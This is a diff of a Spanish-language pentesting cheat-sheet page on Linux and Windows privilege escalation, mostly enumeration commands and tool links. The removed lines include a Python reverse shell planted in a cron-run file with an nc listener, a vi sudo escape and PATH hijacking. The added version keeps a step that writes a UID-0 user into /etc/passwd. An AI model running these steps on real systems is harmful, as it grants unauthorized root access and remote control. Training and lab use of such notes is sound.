@@ -6,16 +6,18 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title class="fab fa-linux">HackSheet Bl3Ak</title>
     <link rel="stylesheet" href="/css/prism.css">
+
+    <link rel="stylesheet" href="/css/prism.css">
     <link rel="icon" href="/images/logo.ico">
     <link href="/css/estilos.css" rel="stylesheet">
     <link href="/css/button.css" rel="stylesheet">
     <link href="/css/linux.css" rel="stylesheet">
-   
-   
-   <!-- primas -->
+
+
+    <!-- primas -->
     <link rel="stylesheet" href="/css/prism.css">
 
-   
+
     <script type="module" src="/cmp/mi-footer.js"></script>
     <script src="https://kit.fontawesome.com/f67adc3b08.js" crossorigin="anonymous"></script>
 </head>
@@ -53,286 +55,427 @@
         <ul>
 
             <img class="image" src="/images/Escalada.png" alt="Tipos de escalamientox">
+            <br>
 
-            <li><span class="comando1">Escalada Horizontal</span>: Se puede hacer de un usuario diferente que esta en el
+            <li style="width: 95%;"><span class="comando1">Escalada Horizontal</span>: Se puede hacer de un usuario
+                diferente que esta en el
                 mismo nivel de privilegios, por lo que le permite heredar cualquier archivo y acceso que tenga ese
                 usuario (archivos SUID).</li>
-            <li><span class="comando1">Escalada Vertical</span>: aqui es donde intentamos tener mayores privilegios o
+            <li style="width: 95%;"><span class="comando1">Escalada Vertical</span>: aqui es donde intentamos tener
+                mayores privilegios o
                 acceso, con una cuenta que ya se ha comprometido, por lo que significa secuestrar una cuanta con
                 privilegios de administrador o privilegios root.</li>
 
 
-            <li><span class="comando1">LinEnum</span>: es un script en bash que ejecuta comando comunes relaciones con
-                la escalacion de privilegios.
+            <br>
+            <br>
+            <li><span class="pasos">Sitios web de consulta</span></li>
+            <a class="enlace" href="https://gtfobins.github.io/" target="_blank"><span class="comando1"></span>
+                GTFOBins</span></a><span>: Cuando encontramos binarios en nuestra enumeracion,
+                STFOBins es una lista seleccionada de binarios de unix que se puede aprivechar para
+                eludir las restricciones de seguridad local.</span>
+            </a>
+            <br>
+            <a class="enlace" href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md"
+                target="_blank"><span class="comando1"></span>
+                Checklists</span></a><span>: Lista de verificacion para encontrar vectores para escalada de
+                privilegios.</span>
+            </a>
+            <br>
+            <a class="enlace"
+                href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md"
+                target="_blank"><span class="comando1"></span>
+                Linux-Privilege-Escalation</span></a><span>: scripts para encontrar vectores para escalada de
+                privilegios.</span>
+            </a>
+            <br>
+            <a class="enlace" href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html"
+                target="_blank"><span class="comando1"></span>
+                Privilege Escalation</span></a><span>: enumeracion de vestores para escalada de privilegios.<span>
+                    </a>
+                    <br>
+                    <a class="enlace" href="https://payatu.com/guide-linux-privilege-escalation" target="_blank"><span
+                            class="comando1"></span>
+                        A Guide To Linux Privilege Escalation</span></a><span>: Guia para encontrar vectores para
+                    escalada de privilegios.</span>
+                </a>
 
-                <ol>
+                <br>
+                <br>
+                <br>
+                <span class="pasos">Busqueda de vectores para escalada de privilegios automaticamente</span>
+                <br>
+                <br>
+                <li><img src="/images/tux.png" /><span class="comando1">Linux</span>
+                </li>
 
-                    <a class="enlace" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh"
-                        target="_blank"><span class="comando1"></span>
+                <li><span class="comando1">LinEnum</span>: es un script en bash que ejecuta comando comunes relaciones
+                    con
+                    la escalacion de privilegios <a class="enlace"
+                        href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh" target="_blank"><span
+                            class="comando1"></span>
+                        Link de descarga
+            </span>
+            </a>
+            </li>
+
+            <li><span class="comando1">LinPeas</span>: es un script en bash que busca posibles caminos para la
+                escalacion de privilegios.
+                la escalacion de privilegios <a class="enlace"
+                    href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh" target="_blank"><span
+                        class="comando1"></span>
+                    Link de descarga</span>
+                </a>
+            </li>
+            <li><span class="comando1">Linux-exploit-suggester</span>: es un script en bash que busca deficiencias de
+                seguridad en un kernel que use linux con exploits conocidos publicamente.<a class="enlace"
+                    href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.s"
+                    target="_blank"><span class="comando1"></span>
+                    Link de descarga</span>
+                </a>
+            </li>
+            <li><span class="comando1">Linux-smart-enumeration</span>: muestra vectores con posible escalada de
+                privilegios.<a class="enlace"
+                    href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh"
+                    target="_blank"><span target="_blank"><span class="comando1"></span>
                         Link de descarga</span>
-                    </a>
-
-                    <li><span class="comando5">Nota: es indispensable guardar esta herramienta </span></li>
-                    <li><span class="pasos">Para poder iniciar debemos seguir los pasos siguiente:</span>
-                        <ol>
-                            <li><span class="comando2">Cargar LinEnum en la maquina victima, mediante un webserver con
-                                    python. </span></li>
-                            <li><span class="comando4">darle permisos de ejecucion (chmod +x &lt;Linenum &gt;).</span>
-                            </li>
-                            <li><span class="comando4">./LinEnum.sh</span></li>
-                        </ol>
-                    <li><span class="comando2">Centrarce en las siguientes salidad de LinEnum</span>
-                        <ol>
-
-                            <li><span class="comando3">Read/Write</span>: son archivos que cualqueir usuario autenticado
-                                puede leer y escribir, si lo analisamos correctamente podemos encontrar fallas, donde
-                                podemos encontrar configuracion incorrectas que permita a los uaurios que normalmente no
-                                deberian poder escribir archivos con mas privilegios.</li>
-                            <li><span class="comando3">Suid File</span>: Salida de archivos SUID, es un tipo especial de
-                                permisos de archivos que se le otroga a un archivo, esto permite que el archivo se
-                                ejecute con los permisos de quien sea el propietario. Si es root se ejecutar como root.
-                            </li>
-                            <li><span class="comando3">Crontab Contents</span>: Se utiliza para programar comandos en un
-                                momento especifico (Son archivos que contiene comando e instrucciones para que se
-                                ejecute en cron daemon. ).
-
-                            </li>
-
-                        </ol>
-                    </li>
-                </ol>
+                </a>
             </li>
-            <br>
-            <li><span class="comando1">Abusar de SUID/GUID Files</span>: primer paso para en la exploracion de escalada
-                de privilegios, en el cual es buscar archivos con el bit SUID/GUID donde este tipo de archivos pueden
-                ejecutarse con los permisos del OWNER/GROUP (super usuario).\
-                <ol>
-                    <li><span class="comando2">Ver los archivos compatibles con SUID </span>
-                        <ol>
-                            <li><span class="comando4">find / -perm -u=s -type f 2&gt;/dev/null</span></li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Ver los permisos que contiene el archivo (rwx-rwx-rwx)</span></li>
-                    <li><span class="comando2">podemos encontrar archivos que ejecuten shell o programas especificos.
-                        </span></li>
-                </ol>
+            <li><span class="comando1">Linux Priv Checker</span>: busca vectores de escalada de privilegios.<a
+                    class="enlace"
+                    href="https://github.com/mzet-/linux-exploit-suggester/blob/master/linux-exploit-suggester.sh"
+                    target="_blank"><span target="_blank"><span class="comando1"></span>
+                        Link de descarga</span>
+                </a>
             </li>
+
+
             <br>
-            <li><Span class="comando1">Explotacion del archivo /ect/passwd</Span>: almacena informacion, la cual es
-                requerido durante el inicio de sesion, donde almacena las credenciales del usuario.
-
-                <ol>
-                    <li><span class="comando2">Contiene una entrada por linea para cada usuario</span>
-
-                        <ol>
-                            <li><span class="comando4">test:x:0:0:root:/root:/bin/bash</span>
-                                <ol>
-                                    <li><span class="comando3">Username</span>: es cuando el usaurio inicia sesión,
-                                        debería ser entre 1 y 32 caracteres de longitud.</li>
-                                    <li><span class="comando3">Password</span>: una X indica que esta encriptado el
-                                        password y esta almacenado en el archivo /etc/shadow.</li>
-                                    <li><span class="comando3">User ID (UID)</span>: cada usuario debe tener asignado un
-                                        user ID (UID).
-                                        EL UID 0(CERO) es reservado para root y UIDs 1-99 son reservados para otras
-                                        cuentas predeterminadas. El sistema reserva otro UID 100-999 para
-                                        accounts/groups administrativos y del sistema.
-                                    </li>
-                                    <li><span class="comando3">Group id (GID)</span>el primer grupo ID (almacenado en
-                                        /etc/group file).</li>
-                                    <li><span class="comando3">User ID info</span>: campo de comentario, permite agregar
-                                        información adicional sobre los usuarios, como el nombre completo del usuario,
-                                        el número de teléfono, etc. Este campo se usa mediante un comando de dedo.</li>
-                                    <li><span class="comando3">Home directory</span>: la ruta absoluta al directorio en
-                                        el que estará el usuario cuando inicio sesión. Si este directorio no existe, el
-                                        directorio de usuarios se convierte en /.</li>
-                                    <li><span class="comando3">Command/Shell</span>: la ruta absoluta de un commando o
-                                        shell (/bajn/bash). Normalmente, se trata de una Shell. Tenga en cuenta que no
-                                        tiene porque ser una Shell.</li>
-                                </ol>
-                            </li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Si encontramos un archovo de escritura /etc/passwd, podemos escribir una
-                            nueva entrada de linea de acuero con la formula anterior y crear un nuevo usuario con
-                            privilegios.</span>
-
-
-                        <ol>
-                            <li></span>openssl passwd -1 -salt [salt] [password]</li>
-                            <li><span class="comando3"> ejecuatamos</span></li>
-                            <li><span class="comando4"> openssl passwd -1 -salt [new] [123]</span></li>
-                            <li><span class="comando3"> nos genera un hash</span></li>
-                            <li><span class="comando4"> $1$new$p7ptkEKU1HnaHpRtzNizS1</span></li>
-                            <li><span class="comando3"> ahora tenemos que poner el hash y crear un nuevo usuario
-                                    root</span></li>
-                            <li><span class="comando4">
-                                    new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</span></li>
-                            <li><span class="comando3"> ahora tenemos que pegar el usuario creado en el archivo
-                                    /etc/passwd</span></li>
-                            <li><span class="comando3"> ahora iniciamos secion con el usuario creado</span></li>
-                            <li><span class="comando4"> su new</span></li>
-                            <li><span class="comando3"> ponermos el password</span></li>
-                            <li><span class="comando4"> 123</span></li>
-                        </ol>
-                    </li>
-                </ol>
+            <li><img src="/images/windows.png" /><span class="comando1">Windows</span>
             </li>
+
+
+            <li><span class="comando1">PowerUp</span>: busca vectores de escalada de privilegios basadas en
+                Configuraciones incorrectas.<a class="enlace"
+                    href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" href=""
+                    target="_blank"><span target="_blank"><span class="comando1"></span>
+                        Link de descarga</span>
+                </a>
+            </li>
+            <li><span class="comando1">WinPeas</span>: busca vectores de escalada de privilegios.<a class="enlace"
+                    href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe/binaries" href=""
+                    target="_blank"><span target="_blank"><span class="comando1"></span>
+                        Link de descarga</span>
+                </a>
+            </li>
+
+
+
             <br>
-            <li><span class="comando1">Sudo -l</span>: usar este comando para enuemerar los comando que podemos usar
-                para usuar como root sin el password de root, el cual nos permite escalar privilegios.
+            <br>
+            <span class="pasos">Busqueda de vectores para escalada de privilegios manualmente</span>
+
+            <br>
+            <br>
+            <li><img src="/images/tux.png" /><span class="comando1">Linux</span>
+                <br>
+                <br>
+            <li><span class="comando2">Regresa el nombre del host, pero en algunos casos, puede proporcionar informacion
+                    sobre la funcion del sistema de destino dentre de la red.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >host</code></pre>
+            </li>
+
+            <li><span class="comando2">Regresa el nombre del sistema dandonos detalles adicionales sobre el kernel
+                    utilizado por el sistema</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >uname -a</code></pre>
+            </li>
+            <li><span class="comando2">Sistema de archivos proc(procfs) nos da informacion sobre los procesos del
+                    sistema de destino (version del kernel).</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >cat /proc/version</code></pre>
+            </li>
+            <li><span class="comando2">Contine informacion sobre el SO.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >cat /etc/issue</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara los procesos de ejecucion.</span>
+
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >ps</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara todos los procesos de ejecucion.</span>
+
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >ps -A</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara el arbol de procesos.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >ps axjf</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara los procesos para todos los usuario(a).</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >ps aux</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara las variables ambientales, donde se podria encontrar binarios para la
+                    ejecucion de codigo por ejemplo python.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >env</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara los comandos con privilegios root.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >sudo -l</code></pre>
+            </li>
+            <li><span class="comando2">Se listaran todos los archivos ocultos.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >ls -al</code></pre>
+            </li>
+            <li><span class="comando2">Proporciona una descripcion general del nivel de privilegios que tiene el usuario
+                    y pertenencia a grupos.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >id</code></pre>
+            </li>
+            <li><span class="comando2">Se mostrara los usuarios junto con sus credenciales.</span>
+                <pre><code class="language-bash line-numbers"data-start="1"
+                    >cat /etc/passwd</code></pre>
 
                 <ol>
-                    <li><span class="comando2">por ejemplo si encontramos que</span>:
-                        <br>
-                        User userx may run the following commands on bby:
-                        (root) NOPASSWD: /usr/bin/vi
-
+                    <li><span class="comando3">Username</span>: es cuando el usaurio inicia sesión,
+                        debería ser entre 1 y 32 caracteres de longitud.</li>
+                    <li><span class="comando3">Password</span>: una X indica que esta encriptado el
+                        password y esta almacenado en el archivo /etc/shadow.</li>
+                    <li><span class="comando3">User ID (UID)</span>: cada usuario debe tener asignado un
+                        user ID (UID).
+                        EL UID 0(CERO) es reservado para root y UIDs 1-99 son reservados para otras
+                        cuentas predeterminadas. El sistema reserva otro UID 100-999 para
+                        accounts/groups administrativos y del sistema.
                     </li>
-                    <li><span class="comando2">vemos que vi puede ejecutar con privilegios de root.</span></li>
-                    <li><span class="comando2">nos dice que no requiere de un password.</span></li>
-                    <li><span class="comando2">Por lo que nos permite escapar de vi para escalar privilegios y obtener
-                            una shell como usuario root.</span></li>
+                    <li><span class="comando3">Group id (GID)</span>el primer grupo ID (almacenado en
+                        /etc/group file).</li>
+                    <li><span class="comando3">User ID info</span>: campo de comentario, permite agregar
+                        información adicional sobre los usuarios, como el nombre completo del usuario,
+                        el número de teléfono, etc. Este campo se usa mediante un comando de dedo.</li>
+                    <li><span class="comando3">Home directory</span>: la ruta absoluta al directorio en
+                        el que estará el usuario cuando inicio sesión. Si este directorio no existe, el
+                        directorio de usuarios se convierte en /.</li>
+                    <li><span class="comando3">Command/Shell</span>: la ruta absoluta de un commando o
+                        shell (/bin/bash).</li>
+                </ol>
+            <li><span class="comando2">Si encontramos un archivo de escritura /etc/passwd, podemos escribir una
+                    nueva entrada de linea de acuero con la formula anterior y crear un nuevo usuario con
+                    privilegios.</span>
 
-                    <a class="enlace" href="https://gtfobins.github.io/" target="_blank"><span class="comando1"></span>
-                        GTFOBins (Link)</span></a> <span class="">: Cuando encontremos binario en nuestra enumeracion,
-                        STFOBins es una lista seleccionada de binarios de unix que un atacante puede aprivechar para
-                        eludir las restricciones de seguridad local</span>
-                    </a>
-                    <li><span class="comando2">abrimos vi</span></li>
-                    <li><span class="comando4"> vi</span></li>
-                    <li><span class="comando2">ejecutamos</span></li>
-                    <li><span class="comando4"> :!Sh</span></li>
-                    <li><span class="comando2">obtenemos una shell como root</span></li>
 
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >openssl passwd -1 -salt &lbrack;salt&rbrack; &lbrack;password&rbrack;</code></pre>
+                    <li><span class="comando3"> ejecuatamos</span></li>
+
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >openssl passwd -1 -salt &lbrack;new&rbrack; &lbrack;123&rbrack;</code></pre>
+                    <li><span class="comando3"> nos genera un hash</span></li>
+                    <li><span class="comando4"> $1$new$p7ptkEKU1HnaHpRtzNizS1</span></li>
+                    <li><span class="comando3"> ahora tenemos que poner el hash y crear un nuevo usuario
+                            root</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash</code></pre>
+
+                    <li><span class="comando3"> ahora tenemos que pegar el usuario creado en el archivo
+                            /etc/passwd</span></li>
+                    <li><span class="comando3"> ahora iniciamos secion con el usuario creado</span></li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >su new</code></pre>
+                    <li><span class="comando3"> ponermos el password</span></li>
+                    <li><span class="comando4"> 123</span></li>
                 </ol>
             </li>
+
+            <li><span class="comando2">Se mostrara los comando anteriores y poder darnos una idea sobre el
+                    sistema.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                            >history</code></pre>
+                </ol>
+
+            </li>
+
+            <li><span class="comando2">Herramienta para enumerar las “Capabilities” habilitadas .</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+            >getcap -r /dev/null</code></pre>
+                </ol>
+            </li>
+
+
+            <li><span class="comando2">Se mostrara las rutas de red existentes.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >ip route</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Se mostrara las comunicaciones despues de verificar las interfaces y las rutas de
+                    red.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                    >netstat</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Se mostrara todos los puertos de escucha y las conexciones establecidas.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -a</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Se mostrara todos los protocolos TCP o UDP.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -at</code></pre>
+                </ol>
+            </li>
+
+            <li><span class="comando2">Se mostrara todos los puertos de en modo "escucha", estos puertos estan abiertos
+                    y listos para ceptar conexciones entrantes.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -l</code></pre>
+                </ol>
+            </li>
+
+            <li><span class="comando2">Enumera las estadisticas de uso de la red por protocolo.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -s</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Enumera las conexiones con el nombre del servicio y la informacion de PID (se
+                    puede usar con la opcion -l).</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -tp</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Muestra las estadisticas de la interfaz.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >netstat -i</code></pre>
+                </ol>
+            </li>
+
             <br>
-            <li><span class="comando1">Explotacion de Crontab</span>: es un proceso de larga ejecucion que ejecuta
-                comando de fecha y horas especificas, en la cual podemos usar esto para programas actividades, ya sea
-                como eventos unico o como tareas recurrentes. Se puede crear archivos crontab que contenga comandos e
+            <span class="comando1">Encontrar comandos con find</span>
+            <li><span class="comando2">Busqueda de directorios llamado config.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >find / -type d -name config 2>/dev/null</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Busqueda de archivos con los permisos 777.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >find / -type f -perm 777 2>/dev/null</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Busqueda de archivos ejecutables.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >find / -perm a=x 2>/dev/null</code></pre>
+                </ol>
+            </li>
+
+            <li><span class="comando2">Busqueda de carpeta ejecutables en todo el sistema.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >find / -perm -o x -type d 2>/dev/null</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Busqueda de archivos con el bit SUID, lo que nos permite ejecutar el archivo con
+                    un nivel de privilegios superior al del usuario actual.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                >find / -perm -u=s -type f 2>/dev/null</code></pre>
+                </ol>
+            </li>
+
+            <br>
+            <span class="comando1">Encontrar tareas que se ejecutan en cron</span>
+            <br>
+            <span>
+                Es un proceso de larga ejecucion que
+                ejecuta comando de fecha y horas especificas, en la cual podemos usar esto para programas actividades,
+                ya
+                sea como eventos unico o como tareas recurrentes. Se puede crear archivos crontab que contenga comandos
+                e
                 intrucciones para que se ejecute Cron daemon.
-
+            </span>
+            <li><span class="comando2">Formato:</span>
                 <ol>
-                    <li><span class="comando2">formato de Cronjob</span>:
-                        <ol>
-                            <li><span class="comando3">#</span>: ID </li>
-                            <li><span class="comando3">m</span>: Minuto</li>
-                            <li><span class="comando3">h</span>: Hora </li>
-                            <li><span class="comando3">dom</span>: Dia del mes</li>
-                            <li><span class="comando3">mon</span>: Mes</li>
-                            <li><span class="comando3">dow</span>: Dia de la semana</li>
-                            <li><span class="comando3">user</span>: Con que usuario se ejecutara el comando</li>
-                            <li><span class="comando3">command</span>: Que comando debe ejecutarse</li>
-                            <li><span class="comando2">Ejemplo</span>:
-
-                                <ol>
-                                    <li><span class="comando3"># m h dom mon dow user command</span></li>
-                                    <li><span class="comando4">17 * 1 * * * root cd / && run-parts --report
-                                            /etc/cron.hourly</span></li>
-                                </ol>
-                            </li>
-                        </ol>
-
-                    <li><span class="pasos">¿Como podemos explotarlo?</span>
+                    <li><span class="comando3">#</span>: ID </li>
+                    <li><span class="comando3">m</span>: Minuto</li>
+                    <li><span class="comando3">h</span>: Hora </li>
+                    <li><span class="comando3">dom</span>: Dia del mes</li>
+                    <li><span class="comando3">mon</span>: Mes</li>
+                    <li><span class="comando3">dow</span>: Dia de la semana</li>
+                    <li><span class="comando3">user</span>: Con que usuario se ejecutara el comando</li>
+                    <li><span class="comando3">command</span>: Que comando debe ejecutarse</li>
+                    <li><span class="comando2">Ejemplo</span>:
 
                         <ol>
-                            <li><span class="comando2">podemos crear un reverse shell en el archivo que se esta
-                                    ejecutando en crontab</span>
-                                <ol>
-                                    <li><span class="comando4">python -c 'import
-                                            socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;turn0&gt;\",&lt;port&gt;));os.dup2(s.fileno(),0);
-                                            os.dup2(s.fileno(),1);
-                                            os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</span>
-                                    </li>
-                                    <li><span class="comando2">Cargar la reverse shell modificada</span></li>
-                                    <li><span class="comando4">printf "python -c 'import
-                                            socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"&lt;turn0&gt;\",&lt;port&gt;));os.dup2(s.fileno(),0);
-                                            os.dup2(s.fileno(),1);
-                                            os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" &gt;
-                                            &lt;archivo&gt;</span></li>
-                                    <li><span class="comando2">Ponemos en escucha nuesta maquina </span></li>
-                                    <li><span class="comando4">sudo nc -lvnp &lt;port&gt;</span></li>
-                                </ol>
-                            </li>
+                            <li><span class="comando3"># m h dom mon dow user command</span></li>
+                            <li><span class="comando4">17 * 1 * * * root cd / && run-parts --report
+                                    /etc/cron.hourly</span></li>
                         </ol>
                     </li>
+
+                    <pre><code class="language-bash line-numbers"data-start="1"
+                        >cat /etc/crontab</code></pre>
                 </ol>
             </li>
 
             <br>
-
-            <li><span class="comando1">Explotacion de la variable PATH</span>: es una variable de entorno en sistemas
-                operativos liinux y unix que especifica directorios que contiene programas ejecutables como (ls, whoami,
-                rm, mkdir, etc), lo que podemos hacer es escribir las variables PATH en la ubicacion que elijamos.
+            <span class="comando1">Encontrar vectores de escalada de privilegios en PATH</span>
+            <br>
+            <span>
+                es una variable de entorno en sistemas operativos liinux y unix que especifica directorios que contiene
+                programas ejecutables como (ls, whoami, rm, mkdir, etc), lo que podemos hacer es escribir las variables
+                PATH en la ubicacion que elijamos.
+            </span>
+            <li><span class="comando2">Busqueda de carpetas sobre escribibles que podemos modificar el PATH.</span>
                 <ol>
-                    <li><span class="comando2">Ejemplo</span>: supongamos que encontramos un ejecutable y que al
-                        ejecutar este archivo, nos ejecuta un ls.</li>
-                    <li><span class="comando2">Ahora que sabemos el comando que realiza el script, nos cambiamos al
-                            directorio tmp</span>
-                        <ol>
-                            <li><span class="comando4">cd /tmp</span></li>
-                        </ol>
-                    <li><span class="comando2">Crearemos un ejecutable imitación, su formato es</span>:
-                        <ol>
-                            <li><span class="comando4">echo "[comando que quermos correr]" > [nombre del ejecutable que
-                                    queremos imitar] </span></li>
-                            <li><span class="comando4">echo "/bin/bash" &gt; ls </span></li>
-
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Damos permisos de ejecucion</span>
-                        <ol>
-                            <li><span class="comando4">chmod +x &lt;nombre del ejecutable que queremos imitar&gt;</span>
-                            </li>
-                            <li><span class="comando4">chmod +x ls</span></li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Ahora necesitamos cambiar la variable PATH, para que apunte al directorio
-                            donde teemos nuestra imitación.</span>
-                        <ol>
-                            <li><span class="comando4">export PATH=/tmp:$PATH</span></li>
-                            <li><span class="comando4">chmod +x ls</span></li>
-                        </ol>
-                    </li>
-                    <li><span class="comando2">Nos cambiamos al directorio del target y corremos el scrip de
-                            nuevo</span></li>
-                    <li><span class="comando2">Para volver al estado normal de los PATH, ejecutamos</span>:
-
-                        <ol>
-                            <li><span class="comando4">export
-                                    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH</span>
-                            </li>
-                        </ol>
-                    </li>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+            >echo $PATH</code></pre>
+                </ol>
+            </li>
+            <li><span class="comando2">Busqueda de carpetas sobre escribibles que podemos modificar el PATH.</span>
+                <ol>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+            >find / -writable 2>/dev/null</code></pre>
                 </ol>
             </li>
             <br>
-            <li><span class="comando1">Lista de verificaciones</span>
+            <span class="comando1">Encontrar vectores de escalada de privilegios en NTF</span>
+            <span>
+                Los archivos creados via NFS heredan la ID del usuario remoto. Si el usuario es root y el aplastamiento
+                de
+                root esta habilitado, la ID se establecera en su lugar en el usuario “nobody”, esto es comun cuando las
+                parpetas compartidas y
+                las interfaces de administracion remota como ssh y telner tambien pueden ayudarnos
+                a obtener acceso como root.
+            </span>
+
+            <li><span class="comando2">Verificacion de NTF.</span>
                 <ol>
-
-                    <a class="enlace" href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md" target="_blank"><span class="comando1"></span>
-                        Checklists (Link)</span></a> <span class=""></span>
-                    </a>
-
-                    <a class="enlace" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank"><span class="comando1"></span>
-                        Linux - Privilege Escalation (Link)</span></a> <span class=""></span>
-                    </a>
-                    <a class="enlace" href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html" target="_blank"><span class="comando1"></span>
-                        Privilege Escalation (Link)</span></a> <span class=""></span>
-                    </a>
-                    <a class="enlace" href="https://payatu.com/guide-linux-privilege-escalation" target="_blank"><span class="comando1"></span>
-                        A Guide To Linux Privilege Escalation (Link)</span></a> <span class=""></span>
-                    </a>
+                    <pre><code class="language-bash line-numbers"data-start="1"
+            >cat /etc/exports</code></pre>
+                    <li>Verificar si esta la opcion no_root_squash, donde si encontramos que esta presente 
+                        en un recurso compartido de escritura, podemoscrear un ejecutable con el bit SUID configurado
+                    y ejecutarlo en el sistema de destino.</li>
                 </ol>
             </li>
-
-
-
-
 
         </ul>
     </div>
-    
+
 
 
     <script src="/javascript/prism.js"></script>
